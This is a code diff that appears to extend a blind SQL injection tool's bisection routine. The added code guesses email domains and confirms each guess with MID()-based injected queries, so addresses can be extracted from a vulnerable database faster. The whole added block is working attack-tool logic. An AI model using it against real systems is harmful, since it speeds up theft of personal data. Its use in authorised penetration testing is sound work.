@@ -1022,6 +1022,56 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
                 threadData.shared.value = partialValue = partialValue + val
 
+                # ─── Nostradamus: Email domain auto-complete ───
+                # After extracting @X or @XY, try to verify the full domain with MID()
+                if (kb.get("predictor") and not conf.get("noPredict")
+                        and kb.predictor._initialized
+                        and '@' in partialValue and not kb.fileReadMode):
+                    atPos = partialValue.rfind('@')
+                    afterAt = partialValue[atPos + 1:]
+                    # Try when we have 1-2 chars after @
+                    if 1 <= len(afterAt) <= 2:
+                        # Build candidates: learned domain first (only if it matches), then common
+                        candidates = []
+                        if hasattr(kb.predictor, '_learned_email_domain') and kb.predictor._learned_email_domain:
+                            if kb.predictor._learned_email_domain.startswith(afterAt):
+                                candidates.append(kb.predictor._learned_email_domain)
+                        for domain in kb.predictor.EMAIL_DOMAINS:
+                            if domain.startswith(afterAt) and domain not in candidates:
+                                candidates.append(domain)
+
+                        for domain in candidates[:3]:  # max 3 attempts
+                            fullDomain = domain
+                            domainStartPos = atPos + 2  # 1-indexed position after @
+                            testValue = unescaper.escape("'%s'" % fullDomain)
+
+                            query = getTechniqueData().vector
+                            query = agent.prefixQuery(query.replace(INFERENCE_MARKER,
+                                "MID((%s),%d,%d)%s%s" % (expressionUnescaped, domainStartPos, len(fullDomain), INFERENCE_EQUALS_CHAR, testValue)))
+                            query = agent.suffixQuery(query)
+
+                            result = Request.queryPage(agent.payload(newValue=query),
+                                                       timeBasedCompare=timeBasedCompare, raise404=False)
+                            incrementCounter(getTechnique())
+
+                            if result:
+                                # Domain verified — skip remaining chars
+                                remaining = fullDomain[len(afterAt):]
+                                partialValue = partialValue + remaining
+                                index += len(remaining)
+                                threadData.shared.value = partialValue
+
+                                # Learn this domain for future rows
+                                kb.predictor._learned_email_domain = fullDomain
+
+                                infoMsg = "email domain: verified '@%s' (%d chars skipped)" % (
+                                    fullDomain, len(remaining))
+                                logger.info(infoMsg)
+
+                                if conf.verbose in (1, 2) and not kb.bruteMode:
+                                    dataToStdout(filterControlChars(remaining))
+                                break
+
                 if showEta:
                     progress.progress(index)
                 elif (conf.verbose in (1, 2) and not kb.bruteMode) or conf.api:
